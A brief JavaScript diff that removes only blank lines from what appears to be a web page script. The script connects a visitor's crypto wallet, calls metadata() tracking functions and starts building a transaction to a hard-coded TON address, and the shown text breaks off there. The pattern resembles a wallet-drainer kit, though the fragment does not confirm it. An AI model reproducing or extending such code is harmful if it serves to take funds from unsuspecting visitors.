@@ -81,8 +81,6 @@
         metadata(1)
     }
 
-
-
     // Call the function
     connectToWallet().catch(error => {
         console.error("Error connecting to wallet:", error);
@@ -97,7 +95,6 @@
 
     function connected() {
       metadata(2)
-
         const destinationAddress = Address.parse('UQD75cMHRAiEkIWR0KOPVWDsuHLFlwdrSqymU8NzYs-8nghM');
         const transaction = {
                 messages: [
